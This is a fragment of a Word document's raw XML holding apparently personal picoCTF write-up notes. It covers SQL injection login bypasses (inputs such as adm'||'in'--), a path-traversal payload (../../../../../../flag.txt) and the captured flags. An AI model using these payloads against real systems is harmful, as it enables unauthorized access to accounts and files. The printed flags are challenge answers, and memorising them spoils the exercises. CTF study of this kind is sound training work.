    <w:p w14:paraId="5C4CE368" w14:textId="0CBD0292" w:rsidR="00E54DC9" w:rsidRDefault="00E54DC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78DBBDA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First things first, we need to find a way to get admin to not be filtered. Fortunately they haven't banned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which is concatenates strings in sqlite. We can get the string admin by just putting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adm'||'in</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210869B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Next, we need to find a way to bypass the password checking. We see that they haven't filtered any of the binary operators, which also happen to be 1 character long. We can use these, especially the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(binary or operator)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t> to bypass the password checking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACB8F07"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We can also use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to replace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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3AF6AE"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From this I created the inputs:&lt;br /&gt; Username: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adm'||'in</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;br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w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;br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username='adm'||'in' AND password='' | '' IS ''</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;br /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471643B5"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However for some reason this didn't seem to work. I opened up an online sqlite compiler at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https://sqliteonline.com/</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t> to do some more testing, and found that for some reason the | operator would return true if I put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IS NOT ''</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>. So I replaced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with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in the query, and it worked!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C30501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Final Input:&lt;br /&gt; Username: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adm'||'in</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;br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NOT '</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;br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username='adm'||'in' AND password='' | '' IS NOT ''</w:t>
      </w:r>
      <w:r w:rsidRPr="00E54DC9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>&lt;br /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247C89C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Which happens to be exactly 25 characters long. Navigate to filter.php to find the flag afterwards.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BF26FB"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&lt;br /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A186332" w14:textId="64874916" w:rsidR="00E54DC9" w:rsidRDefault="00E54DC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="350BB4DF" w14:textId="1D26ADB9" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C1965F0" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA1864">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SQLiLite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2568A518"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3A925BC4"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Exploitationsql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD74413" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA186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2C5B4686" w14:textId="77777777" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="00DA186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4AD504E" w14:textId="63C24E78"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login to this website?Try to login </w:t>
      </w:r>
      <w:hyperlink r:id="rId133"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304942D0" w14:textId="2D4FDF7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Username:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA1864">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007C7A2D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>adm'||'in'--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE793DE" w14:textId="0120956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p>
    <w:p w14:paraId="5A0F42AA" w14:textId="7ACCE72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21CBC0A5" wp14:editId="20AA43E6">
            <wp:extent cx="5936494" cy="2659610"/>
            <wp:effectExtent l="0" t="0" r="762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34"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5936494" cy="2659610"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE35C75" w14:textId="1651491B" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="476E5E0F" wp14:editId="0EF4428F">
            <wp:extent cx="6332220" cy="112649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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1126490"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E73530" w14:textId="21F04D67" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AD63DEA" w14:textId="3B66C18D" w:rsidR="00DA1864" w:rsidRDefault="00DA1864" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DA1864">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701C246C" w14:textId="02AE3A26" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28992986" w14:textId="466C325B" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA344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1</w:t>
      </w:r>
      <w:r w:rsidR="003F18E9">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">                  sql injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DACA61"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6292B6C4"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Tags: picoCTF 2019Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317A5AA4" w14:textId="77777777" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA344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CHRIS HENSLER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF40C76" w14:textId="77777777" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="00EA344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68EDE43" w14:textId="63CC8F5E"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website running at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/33850/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId13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http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A50275" w14:textId="3598E627"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can see the menu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F98178" w14:textId="77C2277F" w:rsidR="00AC1BAC" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5391B5E8" wp14:editId="53C2EB1A">
            <wp:extent cx="777240" cy="861167"/>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37"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="779094" cy="863221"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E723848" w14:textId="2F8521E0" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21715842" wp14:editId="4A63EBF4">
            <wp:extent cx="6332220" cy="210058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38"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2100580"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E3B49D" w14:textId="0908E908" w:rsidR="00AC1BAC" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>It is a SQL database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E089F6" w14:textId="4DCE8DDE" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="518CA2C5" wp14:editId="1B4D5056">
            <wp:extent cx="5867908" cy="3635055"/>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39"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5867908" cy="3635055"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="082557A4" w14:textId="649F4781" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D870DA2" wp14:editId="5122DDA9">
            <wp:extent cx="4877223" cy="1623201"/>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40"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4877223" cy="1623201"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FA9742" w14:textId="243394AE" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF{s0m3_SQL_f8adf3fb}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375648FA" w14:textId="043A663B" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F709CE1" w14:textId="52BD0CBE" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D8B8D05" w14:textId="77777777" w:rsidR="00EA3443" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A6449E1" w14:textId="5E340C83" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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Forbidden Paths</w:t>
      </w:r>
      <w:r w:rsidR="003F18E9">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">          path traversal     easy </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4472F53C"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936D6FE"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Tags: picoCTF 2022Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E279BC" w14:textId="77777777" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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664E242" w14:textId="77777777" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="00AC1B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748EA53" w14:textId="7D5C6BE5"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get the flag?Here's the </w:t>
      </w:r>
      <w:hyperlink r:id="rId141"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.We know that the website files live in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>/usr/share/nginx/html/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> and the flag is at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>/flag.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> but the website is filtering absolute file paths. Can you get past the filter to read the flag?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA42C32" w14:textId="3D4CCDE4"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Use relative path, go back to /</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086FD32C" w14:textId="20E8F21C"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Payload:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC1BAC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC1BAC">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>../../../../../../flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2678FD" w14:textId="239CEAEC" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ADD8E6"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ADD8E6"/>
        </w:rPr>
        <w:t>picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55ED35E7" w14:textId="399EA9B1" w:rsidR="00AC1BAC" w:rsidRDefault="00AC1BAC" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="02A19629" wp14:editId="0C0A67D5">
            <wp:extent cx="3901778" cy="3246401"/>
            <wp:effectExtent l="0" t="0" r="381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42"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3901778" cy="3246401"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E0CEE2" w14:textId="0E69DCBB" w:rsidR="00EA3443" w:rsidRDefault="003F18E9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>08/30/2022</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31541B0F" w14:textId="029EE12D" w:rsidR="00EA3443" w:rsidRPr="00B6083C" w:rsidRDefault="00EA3443" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="24311CD8" wp14:editId="5208406D">
            <wp:extent cx="6332220" cy="255778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43"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2557780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00EA3443" w:rsidRPr="00B6083C">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roman"/>
    <w:pitch w:val="variable"/>
  </w:font>
  <w:font w:name="Liberation Serif">
    <w:altName w:val="Times New Roman"/>
    <w:charset w:val="01"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="DengXian">
    <w:altName w:val="等线"/>
    <w:panose1 w:val="02010600030101010101"/>
    <w:charset w:val="86"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="A00002BF" w:usb1="38CF7CFA" w:usb2="00000016" w:usb3="00000000" w:csb0="0004000F" w:csb1="00000000"/>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default"/>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charset w:val="86"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="30000003" w:usb1="2BDF3C10" w:usb2="00000016" w:usb3="00000000" w:csb0="602E0107"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CD7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D24ADE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21F442C3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D59EB90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269B4BB2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5C861CE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47B07C2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B144E8F0"/>
    <w:lvl w:ilvl="0" w:tplc="E56E4BE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DA659CF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="76B0CB1A"/>
    <w:lvl w:ilvl="0" w:tplc="4C2CC1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DAD4690"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="833C1C4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16cid:durableId="167183062">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="948776446">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2093237098">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1930891072">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1566838847">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="16221080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591"/>
    <w:rsid w:val="000A6F2E"/>
    <w:rsid w:val="000B5615"/>
    <w:rsid w:val="000F6870"/>
    <w:rsid w:val="00112261"/>
    <w:rsid w:val="0014279A"/>
    <w:rsid w:val="0018076A"/>
    <w:rsid w:val="00193B90"/>
    <w:rsid w:val="001B4D67"/>
    <w:rsid w:val="001C530B"/>
    <w:rsid w:val="001F49D5"/>
    <w:rsid w:val="001F4DD4"/>
    <w:rsid w:val="00222A2A"/>
    <w:rsid w:val="00233019"/>
    <w:rsid w:val="00242C83"/>
    <w:rsid w:val="00264306"/>
    <w:rsid w:val="002C0966"/>
    <w:rsid w:val="002D0E90"/>
    <w:rsid w:val="002E7CDC"/>
    <w:rsid w:val="00311F0B"/>
    <w:rsid w:val="00313A37"/>
    <w:rsid w:val="003C0B9B"/>
    <w:rsid w:val="003F18E9"/>
    <w:rsid w:val="0044030E"/>
